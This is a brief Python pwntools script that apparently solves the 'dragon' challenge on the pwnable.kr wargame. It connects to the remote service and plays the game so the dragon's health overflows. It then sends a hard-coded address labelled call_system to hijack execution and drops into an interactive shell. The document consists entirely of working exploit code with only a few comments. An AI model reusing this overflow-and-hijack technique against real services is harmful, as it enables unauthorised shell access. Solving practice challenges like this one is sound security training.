from pwn import *

call_system = 0x8048dbf
sh = remote("pwnable.kr", 9004)

# suicide first
for i in range(0, 2):
    sh.recv()
    sh.sendline("2")

# dragon heals itself, resulting in overflow
sh.sendline("1")
for i in range(0, 4):
    sh.sendline("3")
    sh.sendline("3")
    sh.sendline("2")

# sh.recvuntil("The World Will Remember You As:")
sh.sendline(p32(call_system))
sh.interactive()

# MaMa, Gandhi was right! :)
